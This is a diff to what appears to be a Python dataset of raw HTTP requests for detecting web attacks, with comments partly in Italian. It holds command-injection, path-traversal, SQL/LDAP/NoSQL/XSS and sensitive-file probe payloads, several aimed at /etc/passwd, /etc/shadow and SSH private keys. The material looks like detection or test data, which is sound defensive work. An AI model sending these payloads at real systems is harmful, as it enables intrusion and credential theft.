@@ -116,7 +116,8 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
-    """192.168.1.10 GET /ads/banner1.js HTTP/1.1
+    """192.168.1.10
+GET /ads/banner1.js HTTP/1.1
 Host: adserver1.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -125,7 +126,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """10.0.0.5 GET /track?uid=12345 HTTP/1.1
+    """10.0.0.5
+GET /track?uid=12345 HTTP/1.1
 Host: tracker.ads.com
 User-Agent: curl/7.68.0
 Accept: text/html
@@ -134,7 +136,8 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7
 Accept-Language: en-US
 Connection: close
 """,
-    """172.16.0.2 GET /popup?adid=789 HTTP/1.1
+    """172.16.0.2
+GET /popup?adid=789 HTTP/1.1
 Host: popads.net
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -143,7 +146,8 @@ Accept-Charset: UTF-8
 Accept-Language: it-IT
 Connection: keep-alive
 """,
-    """203.0.113.8 GET /redirect?url=http://malicious.com HTTP/1.1
+    """203.0.113.8
+GET /redirect?url=http://malicious.com HTTP/1.1
 Host: clicker.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -152,7 +156,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-GB
 Connection: keep-alive
 """,
-    """192.168.100.20 GET /banner?zone=top HTTP/1.1
+    """192.168.100.20
+GET /banner?zone=top HTTP/1.1
 Host: banners.adnet.com
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -161,7 +166,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: close
 """,
-    """10.10.10.10 GET /js/ad.js HTTP/1.1
+    """10.10.10.10
+GET /js/ad.js HTTP/1.1
 Host: adinjector.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/javascript
@@ -170,7 +176,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """172.16.1.1 GET /pixel.gif?track=1 HTTP/1.1
+    """172.16.1.1
+GET /pixel.gif?track=1 HTTP/1.1
 Host: pixel.tracker.com
 User-Agent: Mozilla/5.0
 Accept: image/gif
@@ -179,7 +186,8 @@ Accept-Charset: UTF-8
 Accept-Language: fr-FR
 Connection: keep-alive
 """,
-    """192.0.2.1 GET /adsense?slot=footer HTTP/1.1
+    """192.0.2.1
+GET /adsense?slot=footer HTTP/1.1
 Host: adsense.fake
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml
@@ -188,7 +196,8 @@ Accept-Charset: UTF-8
 Accept-Language: es-ES
 Connection: close
 """,
-    """198.51.100.2 GET /adclick?banner=123 HTTP/1.1
+    """198.51.100.2
+GET /adclick?banner=123 HTTP/1.1
 Host: clicktracker.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -197,7 +206,8 @@ Accept-Charset: UTF-8
 Accept-Language: de-DE
 Connection: keep-alive
 """,
-    """203.0.113.9 GET /popunder?ad=456 HTTP/1.1
+    """203.0.113.9
+GET /popunder?ad=456 HTTP/1.1
 Host: popunder.net
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -206,7 +216,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """192.168.1.11 GET /adframe?size=300x250 HTTP/1.1
+    """192.168.1.11
+GET /adframe?size=300x250 HTTP/1.1
 Host: adframes.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -215,7 +226,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """10.0.0.6 GET /servead?type=video HTTP/1.1
+    """10.0.0.6
+GET /servead?type=video HTTP/1.1
 Host: videoads.com
 User-Agent: curl/7.80.0
 Accept: video/mp4
@@ -224,7 +236,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: close
 """,
-    """172.16.0.3 GET /ad.js?rnd=123456 HTTP/1.1
+    """172.16.0.3
+GET /ad.js?rnd=123456 HTTP/1.1
 Host: jsads.net
 User-Agent: Wget/1.21.1
 Accept: application/javascript
@@ -233,7 +246,8 @@ Accept-Charset: UTF-8
 Accept-Language: it-IT
 Connection: keep-alive
 """,
-    """203.0.113.10 GET /banner2.jpg HTTP/1.1
+    """203.0.113.10
+GET /banner2.jpg HTTP/1.1
 Host: imgads.com
 User-Agent: Mozilla/5.0
 Accept: image/jpeg
@@ -242,7 +256,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-GB
 Connection: keep-alive
 """,
-    """192.168.100.21 GET /adzone?cat=games HTTP/1.1
+    """192.168.100.21
+GET /adzone?cat=games HTTP/1.1
 Host: adzone.com
 User-Agent: python-requests/2.28.0
 Accept: */*
@@ -251,7 +266,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: close
 """,
-    """10.10.10.11 GET /adtrack?event=impression HTTP/1.1
+    """10.10.10.11
+GET /adtrack?event=impression HTTP/1.1
 Host: adtrack.net
 User-Agent: PostmanRuntime/7.29.0
 Accept: application/json
@@ -260,7 +276,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """172.16.1.2 GET /ads/banner3.js HTTP/1.1
+    """172.16.1.2
+GET /ads/banner3.js HTTP/1.1
 Host: adserver2.com
 User-Agent: Mozilla/5.0
 Accept: application/javascript
@@ -269,7 +286,8 @@ Accept-Charset: UTF-8
 Accept-Language: fr-FR
 Connection: keep-alive
 """,
-    """192.0.2.2 GET /redirect?adid=999 HTTP/1.1
+    """192.0.2.2
+GET /redirect?adid=999 HTTP/1.1
 Host: redirectads.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -278,7 +296,8 @@ Accept-Charset: UTF-8
 Accept-Language: es-ES
 Connection: close
 """,
-    """198.51.100.3 GET /ad?type=popup HTTP/1.1
+    """198.51.100.3
+GET /ad?type=popup HTTP/1.1
 Host: popad.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -287,7 +306,8 @@ Accept-Charset: UTF-8
 Accept-Language: de-DE
 Connection: keep-alive
 """,
-    """203.0.113.10 GET /ads/banner4.js HTTP/1.1
+    """203.0.113.10
+GET /ads/banner4.js HTTP/1.1
 Host: adserver3.com
 User-Agent: Mozilla/5.0
 Accept: application/javascript
@@ -695,7 +715,8 @@ Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
     # Command injection via parametro GET
-    """192.168.1.10 GET /run?cmd=ls%20-la;cat%20/etc/passwd HTTP/1.1
+    """192.168.1.10
+GET /run?cmd=ls%20-la;cat%20/etc/passwd HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -705,7 +726,8 @@ Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
     # Command injection via POST
-    """10.0.0.5 POST /admin HTTP/1.1
+    """10.0.0.5
+POST /admin HTTP/1.1
 Host: testsite.com
 User-Agent: curl/7.68.0
 Accept: text/html
@@ -719,7 +741,8 @@ Content-Length: 30
 action=ping;uname -a
 """,
     # PHP code injection
-    """172.16.0.2 GET /vuln.php?eval=phpinfo(); HTTP/1.1
+    """172.16.0.2
+GET /vuln.php?eval=phpinfo(); HTTP/1.1
 Host: vulnerable.com
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -729,7 +752,8 @@ Accept-Language: it-IT,it;q=0.8
 Connection: keep-alive
 """,
     # Python code execution
-    """203.0.113.8 GET /exec?code=__import__('os').system('id') HTTP/1.1
+    """203.0.113.8
+GET /exec?code=__import__('os').system('id') HTTP/1.1
 Host: webmail.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -739,7 +763,8 @@ Accept-Language: en-GB,en;q=0.8
 Connection: keep-alive
 """,
     # Ruby code execution
-    """192.168.100.20 GET /run?cmd=`ls /` HTTP/1.1
+    """192.168.100.20
+GET /run?cmd=`ls /` HTTP/1.1
 Host: iotdevice.local
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -749,7 +774,8 @@ Accept-Language: en-US
 Connection: close
 """,
     # Node.js code execution
-    """10.10.10.10 GET /api?input=require('child_process').execSync('ls') HTTP/1.1
+    """10.10.10.10
+GET /api?input=require('child_process').execSync('ls') HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/json
@@ -759,7 +785,8 @@ Accept-Language: en-US
 Connection: keep-alive
 """,
     # Bash injection
-    """172.16.1.1 POST /cgi-bin/test.cgi HTTP/1.1
+    """172.16.1.1
+POST /cgi-bin/test.cgi HTTP/1.1
 Host: mysite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -773,7 +800,8 @@ Content-Length: 40
 input=;cat /etc/shadow
 """,
     # Perl code execution
-    """192.0.2.1 GET /cgi-bin/perl.cgi?input=system('ls') HTTP/1.1
+    """192.0.2.1
+GET /cgi-bin/perl.cgi?input=system('ls') HTTP/1.1
 Host: demo.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml
@@ -783,7 +811,8 @@ Accept-Language: es-ES,es;q=0.8
 Connection: close
 """,
     # Java code execution
-    """198.51.100.2 GET /run?code=Runtime.getRuntime().exec('ls') HTTP/1.1
+    """198.51.100.2
+GET /run?code=Runtime.getRuntime().exec('ls') HTTP/1.1
 Host: formsite.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -793,7 +822,8 @@ Accept-Language: de-DE,de;q=0.8
 Connection: keep-alive
 """,
     # PowerShell injection
-    """203.0.113.9 POST /powershell HTTP/1.1
+    """203.0.113.9
+POST /powershell HTTP/1.1
 Host: submit.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -807,7 +837,8 @@ Content-Length: 50
 command=Invoke-Expression('Get-Process')
 """,
     # Command injection con pipe
-    """192.168.1.11 GET /status?check=up|whoami HTTP/1.1
+    """192.168.1.11
+GET /status?check=up|whoami HTTP/1.1
 Host: admin.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -817,7 +848,8 @@ Accept-Language: en-US
 Connection: keep-alive
 """,
     # PHP code execution con assert
-    """10.0.0.6 GET /vuln.php?assert=system('ls') HTTP/1.1
+    """10.0.0.6
+GET /vuln.php?assert=system('ls') HTTP/1.1
 Host: files.com
 User-Agent: curl/7.80.0
 Accept: text/html
@@ -827,7 +859,8 @@ Accept-Language: en-US
 Connection: close
 """,
     # Node.js eval
-    """172.16.0.3 GET /api?eval=process.mainModule.require('child_process').execSync('id') HTTP/1.1
+    """172.16.0.3
+GET /api?eval=process.mainModule.require('child_process').execSync('id') HTTP/1.1
 Host: corp.com
 User-Agent: Wget/1.21.1
 Accept: text/html
@@ -837,7 +870,8 @@ Accept-Language: it-IT
 Connection: keep-alive
 """,
     # Bash injection con backtick
-    """203.0.113.10 POST /cgi-bin/test.cgi HTTP/1.1
+    """203.0.113.10
+POST /cgi-bin/test.cgi HTTP/1.1
 Host: download.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -851,7 +885,8 @@ Content-Length: 40
 input=`cat /etc/passwd`
 """,
     # Python exec
-    """192.168.100.21 GET /exec?input=exec('import os;os.system(\"ls\")') HTTP/1.1
+    """192.168.100.21
+GET /exec?input=exec('import os;os.system(\"ls\")') HTTP/1.1
 Host: iot2.local
 User-Agent: python-requests/2.28.0
 Accept: */*
@@ -861,7 +896,8 @@ Accept-Language: en-US
 Connection: close
 """,
     # Ruby eval
-    """10.10.10.11 GET /run?eval=eval('`ls`') HTTP/1.1
+    """10.10.10.11
+GET /run?eval=eval('`ls`') HTTP/1.1
 Host: apisite2.com
 User-Agent: PostmanRuntime/7.29.0
 Accept: application/json
@@ -871,7 +907,8 @@ Accept-Language: en-US
 Connection: keep-alive
 """,
     # JavaScript injection in Node.js
-    """172.16.1.2 GET /api?js=eval('require(\"child_process\").execSync(\"ls\")') HTTP/1.1
+    """172.16.1.2
+GET /api?js=eval('require(\"child_process\").execSync(\"ls\")') HTTP/1.1
 Host: shellsite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -881,7 +918,8 @@ Accept-Language: fr-FR
 Connection: keep-alive
 """,
     # Perl injection
-    """192.0.2.2 GET /cgi-bin/perl.cgi?input=qx(ls) HTTP/1.1
+    """192.0.2.2
+GET /cgi-bin/perl.cgi?input=qx(ls) HTTP/1.1
 Host: demo2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -891,7 +929,8 @@ Accept-Language: es-ES
 Connection: close
 """,
     # Windows command injection
-    """198.51.100.3 GET /run?cmd=dir%20C:\\ HTTP/1.1
+    """198.51.100.3
+GET /run?cmd=dir%20C:\\ HTTP/1.1
 Host: formsite2.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -901,7 +940,8 @@ Accept-Language: de-DE
 Connection: keep-alive
 """,
     # Bash injection con && 
-    """203.0.113.10 GET /cgi-bin/test.cgi?input=foo&&cat%20/etc/shadow HTTP/1.1
+    """203.0.113.10
+GET /cgi-bin/test.cgi?input=foo&&cat%20/etc/shadow HTTP/1.1
 Host: submit2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1030,7 +1070,8 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
-    """192.168.1.10 GET /../../etc/passwd HTTP/1.1
+    """192.168.1.10
+GET /../../etc/passwd HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1039,7 +1080,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
-    """10.0.0.5 GET /..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    """10.0.0.5
+GET /..%2F..%2Fetc%2Fpasswd HTTP/1.1
 Host: testsite.com
 User-Agent: curl/7.68.0
 Accept: text/html
@@ -1048,7 +1090,8 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7
 Accept-Language: en-US
 Connection: close
 """,
-    """172.16.0.2 GET /images/../../../etc/shadow HTTP/1.1
+    """172.16.0.2
+GET /images/../../../etc/shadow HTTP/1.1
 Host: vulnerable.com
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -1057,7 +1100,8 @@ Accept-Charset: UTF-8
 Accept-Language: it-IT,it;q=0.8
 Connection: keep-alive
 """,
-    """203.0.113.8 GET /download?file=../../../../etc/hosts HTTP/1.1
+    """203.0.113.8
+GET /download?file=../../../../etc/hosts HTTP/1.1
 Host: webmail.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1066,7 +1110,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-GB,en;q=0.8
 Connection: keep-alive
 """,
-    """192.168.100.20 GET /view.php?page=../../../../boot.ini HTTP/1.1
+    """192.168.100.20
+GET /view.php?page=../../../../boot.ini HTTP/1.1
 Host: iotdevice.local
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -1075,7 +1120,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: close
 """,
-    """10.10.10.10 GET /?file=..\\..\\windows\\win.ini HTTP/1.1
+    """10.10.10.10
+GET /?file=..\\..\\windows\\win.ini HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/json
@@ -1084,7 +1130,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """172.16.1.1 GET /../../../../../../../../etc/group HTTP/1.1
+    """172.16.1.1
+GET /../../../../../../../../etc/group HTTP/1.1
 Host: mysite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1093,7 +1140,8 @@ Accept-Charset: UTF-8
 Accept-Language: fr-FR,fr;q=0.9
 Connection: keep-alive
 """,
-    """192.0.2.1 GET /data/..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts HTTP/1.1
+    """192.0.2.1
+GET /data/..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts HTTP/1.1
 Host: demo.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml
@@ -1102,7 +1150,8 @@ Accept-Charset: UTF-8
 Accept-Language: es-ES,es;q=0.8
 Connection: close
 """,
-    """198.51.100.2 GET /index.php?path=../../../../../../etc/passwd HTTP/1.1
+    """198.51.100.2
+GET /index.php?path=../../../../../../etc/passwd HTTP/1.1
 Host: formsite.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1111,7 +1160,8 @@ Accept-Charset: UTF-8
 Accept-Language: de-DE,de;q=0.8
 Connection: keep-alive
 """,
-    """203.0.113.9 GET /../../../../var/log/auth.log HTTP/1.1
+    """203.0.113.9
+GET /../../../../var/log/auth.log HTTP/1.1
 Host: submit.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1120,7 +1170,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """192.168.1.11 GET /admin/../../../../etc/ssh/sshd_config HTTP/1.1
+    """192.168.1.11
+GET /admin/../../../../etc/ssh/sshd_config HTTP/1.1
 Host: admin.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1129,7 +1180,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """10.0.0.6 GET /files?name=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    """10.0.0.6
+GET /files?name=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
 Host: files.com
 User-Agent: curl/7.80.0
 Accept: text/html
@@ -1138,7 +1190,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: close
 """,
-    """172.16.0.3 GET /../../../../../../../../etc/issue HTTP/1.1
+    """172.16.0.3
+GET /../../../../../../../../etc/issue HTTP/1.1
 Host: corp.com
 User-Agent: Wget/1.21.1
 Accept: text/html
@@ -1147,7 +1200,8 @@ Accept-Charset: UTF-8
 Accept-Language: it-IT
 Connection: keep-alive
 """,
-    """203.0.113.10 GET /download.php?doc=..\\..\\..\\..\\boot.ini HTTP/1.1
+    """203.0.113.10
+GET /download.php?doc=..\\..\\..\\..\\boot.ini HTTP/1.1
 Host: download.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1156,7 +1210,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-GB
 Connection: keep-alive
 """,
-    """192.168.100.21 GET /../../../../../../../../etc/hostname HTTP/1.1
+    """192.168.100.21
+GET /../../../../../../../../etc/hostname HTTP/1.1
 Host: iot2.local
 User-Agent: python-requests/2.28.0
 Accept: */*
@@ -1165,7 +1220,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: close
 """,
-    """10.10.10.11 GET /view?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
+    """10.10.10.11
+GET /view?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
 Host: apisite2.com
 User-Agent: PostmanRuntime/7.29.0
 Accept: application/json
@@ -1174,7 +1230,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """172.16.1.2 GET /../../../../../../../../etc/cron.d HTTP/1.1
+    """172.16.1.2
+GET /../../../../../../../../etc/cron.d HTTP/1.1
 Host: shellsite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1183,7 +1240,8 @@ Accept-Charset: UTF-8
 Accept-Language: fr-FR
 Connection: keep-alive
 """,
-    """192.0.2.2 GET /../../../../../../../../root/.bashrc HTTP/1.1
+    """192.0.2.2
+GET /../../../../../../../../root/.bashrc HTTP/1.1
 Host: demo2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1192,7 +1250,8 @@ Accept-Charset: UTF-8
 Accept-Language: es-ES
 Connection: close
 """,
-    """198.51.100.3 GET /api?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1
+    """198.51.100.3
+GET /api?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1
 Host: formsite2.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1201,7 +1260,8 @@ Accept-Charset: UTF-8
 Accept-Language: de-DE
 Connection: keep-alive
 """,
-    """203.0.113.10 GET /../../../../../../../../etc/mysql/my.cnf HTTP/1.1
+    """203.0.113.10
+GET /../../../../../../../../etc/mysql/my.cnf HTTP/1.1
 Host: submit2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1210,7 +1270,8 @@ Accept-Charset: UTF-8
 Accept-Language: en-US
 Connection: keep-alive
 """,
-    """192.168.1.12 GET /../../../../../../../../var/www/html/index.php HTTP/1.1
+    """192.168.1.12
+GET /../../../../../../../../var/www/html/index.php HTTP/1.1
 Host: webroot.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1286,7 +1347,8 @@ Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
     # Directory listing
-    """192.168.1.10 GET / HTTP/1.1
+    """192.168.1.10
+GET / HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1295,7 +1357,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di configurazione
-    """10.0.0.5 GET /.env HTTP/1.1
+    """10.0.0.5
+GET /.env HTTP/1.1
 Host: testsite.com
 User-Agent: curl/7.68.0
 Accept: text/plain
@@ -1304,7 +1367,8 @@ Connection: close
 """,
 
     # Accesso a file di backup
-    """172.16.0.2 GET /config.php.bak HTTP/1.1
+    """172.16.0.2
+GET /config.php.bak HTTP/1.1
 Host: vulnerable.com
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -1313,7 +1377,8 @@ Connection: keep-alive
 """,
 
     # Stack trace in risposta a input errato
-    """203.0.113.8 GET /search?query=%25 HTTP/1.1
+    """203.0.113.8
+GET /search?query=%25 HTTP/1.1
 Host: webmail.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1322,7 +1387,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di log
-    """192.168.100.20 GET /logs/error.log HTTP/1.1
+    """192.168.100.20
+GET /logs/error.log HTTP/1.1
 Host: iotdevice.local
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -1331,7 +1397,8 @@ Connection: close
 """,
 
     # Accesso a file di database SQLite
-    """10.10.10.10 GET /db.sqlite3 HTTP/1.1
+    """10.10.10.10
+GET /db.sqlite3 HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/octet-stream
@@ -1340,7 +1407,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di password
-    """172.16.1.1 GET /admin/passwords.txt HTTP/1.1
+    """172.16.1.1
+GET /admin/passwords.txt HTTP/1.1
 Host: mysite.org
 User-Agent: Mozilla/5.0
 Accept: text/plain
@@ -1349,7 +1417,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di chiavi private
-    """192.0.2.1 GET /.ssh/id_rsa HTTP/1.1
+    """192.0.2.1
+GET /.ssh/id_rsa HTTP/1.1
 Host: demo.com
 User-Agent: Mozilla/5.0
 Accept: text/plain
@@ -1358,7 +1427,8 @@ Connection: close
 """,
 
     # Debug attivo
-    """198.51.100.2 GET /debug HTTP/1.1
+    """198.51.100.2
+GET /debug HTTP/1.1
 Host: formsite.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1367,7 +1437,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di configurazione Apache
-    """203.0.113.9 GET /.htaccess HTTP/1.1
+    """203.0.113.9
+GET /.htaccess HTTP/1.1
 Host: submit.com
 User-Agent: Mozilla/5.0
 Accept: text/plain
@@ -1375,7 +1446,8 @@ Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 """,
     # Accesso a file di configurazione in sottocartella
-    """192.168.1.20 GET /config/.env HTTP/1.1
+    """192.168.1.20
+GET /config/.env HTTP/1.1
 Host: example2.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1384,7 +1456,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di backup con estensione diversa
-    """10.0.0.15 GET /admin/config.old HTTP/1.1
+    """10.0.0.15
+GET /admin/config.old HTTP/1.1
 Host: testsite2.com
 User-Agent: curl/7.80.0
 Accept: text/plain
@@ -1393,7 +1466,8 @@ Connection: close
 """,
 
     # Accesso a file di log in directory diversa
-    """172.16.0.22 GET /var/log/app.log HTTP/1.1
+    """172.16.0.22
+GET /var/log/app.log HTTP/1.1
 Host: vulnerable2.com
 User-Agent: Wget/1.21.1
 Accept: text/html
@@ -1402,7 +1476,8 @@ Connection: keep-alive
 """,
 
     # Stack trace tramite POST con input errato
-    """203.0.113.18 POST /api/search HTTP/1.1
+    """203.0.113.18
+POST /api/search HTTP/1.1
 Host: webmail2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1415,7 +1490,8 @@ Content-Length: 20
 """,
 
     # Accesso a file di chiavi pubbliche
-    """192.168.100.30 GET /.ssh/id_rsa.pub HTTP/1.1
+    """192.168.100.30
+GET /.ssh/id_rsa.pub HTTP/1.1
 Host: iotdevice2.local
 User-Agent: python-requests/2.28.0
 Accept: */*
@@ -1424,7 +1500,8 @@ Connection: close
 """,
 
     # Accesso a file di configurazione Nginx
-    """10.10.10.20 GET /etc/nginx/nginx.conf HTTP/1.1
+    """10.10.10.20
+GET /etc/nginx/nginx.conf HTTP/1.1
 Host: apisite2.com
 User-Agent: PostmanRuntime/7.29.0
 Accept: application/octet-stream
@@ -1433,7 +1510,8 @@ Connection: keep-alive
 """,
 
     # Directory listing in sottocartella
-    """172.16.1.12 GET /uploads/ HTTP/1.1
+    """172.16.1.12
+GET /uploads/ HTTP/1.1
 Host: mysite2.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1442,7 +1520,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di dump del database
-    """192.0.2.12 GET /backup/db_dump.sql HTTP/1.1
+    """192.0.2.12
+GET /backup/db_dump.sql HTTP/1.1
 Host: demo2.com
 User-Agent: Mozilla/5.0
 Accept: text/plain
@@ -1451,7 +1530,8 @@ Connection: close
 """,
 
     # Debug mode attivo tramite parametro
-    """198.51.100.12 GET /app?debug=true HTTP/1.1
+    """198.51.100.12
+GET /app?debug=true HTTP/1.1
 Host: formsite2.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1460,7 +1540,8 @@ Connection: keep-alive
 """,
 
     # Accesso a file di configurazione PHP
-    """203.0.113.19 GET /phpinfo.php HTTP/1.1
+    """203.0.113.19
+GET /phpinfo.php HTTP/1.1
 Host: submit2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1604,7 +1685,8 @@ Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
     # SQL Injection
-    """192.168.1.10 GET /login?user=admin'--&pass= HTTP/1.1
+    """192.168.1.10
+GET /login?user=admin'--&pass= HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1617,7 +1699,8 @@ Content-Length: 0
 """,
 
     # Command Injection (Linux)
-    """10.0.0.5 POST /ping HTTP/1.1
+    """10.0.0.5
+POST /ping HTTP/1.1
 Host: testsite.com
 User-Agent: curl/7.68.0
 Accept: text/html
@@ -1632,7 +1715,8 @@ host=127.0.0.1;cat /etc/passwd
 """,
 
     # LDAP Injection
-    """172.16.0.2 GET /search?user=*)(uid=*))(|(uid=* HTTP/1.1
+    """172.16.0.2
+GET /search?user=*)(uid=*))(|(uid=* HTTP/1.1
 Host: vulnerable.com
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -1645,7 +1729,8 @@ Content-Length: 0
 """,
 
     # XPath Injection
-    """203.0.113.8 GET /xml?user=admin' or '1'='1 HTTP/1.1
+    """203.0.113.8
+GET /xml?user=admin' or '1'='1 HTTP/1.1
 Host: webmail.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1658,7 +1743,8 @@ Content-Length: 0
 """,
 
     # XML Injection
-    """192.168.100.20 POST /api/xml HTTP/1.1
+    """192.168.100.20
+POST /api/xml HTTP/1.1
 Host: iotdevice.local
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -1673,7 +1759,8 @@ Content-Length: 80
 """,
 
     # NoSQL Injection (MongoDB)
-    """10.10.10.10 GET /user?name[$ne]=&password[$ne]= HTTP/1.1
+    """10.10.10.10
+GET /user?name[$ne]=&password[$ne]= HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/json
@@ -1686,7 +1773,8 @@ Content-Length: 0
 """,
 
     # Shell Injection (Windows)
-    """172.16.1.1 POST /run HTTP/1.1
+    """172.16.1.1
+POST /run HTTP/1.1
 Host: mysite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1701,7 +1789,8 @@ cmd=dir & type C:\\Windows\\System32\\drivers\\etc\\hosts
 """,
 
     # HTML Injection
-    """192.0.2.1 GET /profile?bio=<b>Injected!</b> HTTP/1.1
+    """192.0.2.1
+GET /profile?bio=<b>Injected!</b> HTTP/1.1
 Host: demo.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml
@@ -1714,7 +1803,8 @@ Content-Length: 0
 """,
 
     # JavaScript Injection
-    """198.51.100.2 GET /search?q=</script><script>alert('js')</script> HTTP/1.1
+    """198.51.100.2
+GET /search?q=</script><script>alert('js')</script> HTTP/1.1
 Host: formsite.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1727,7 +1817,8 @@ Content-Length: 0
 """,
 
     # PHP Injection
-    """203.0.113.9 GET /index.php?page=php://input HTTP/1.1
+    """203.0.113.9
+GET /index.php?page=php://input HTTP/1.1
 Host: submit.com
 User-Agent: Mozilla/5.0
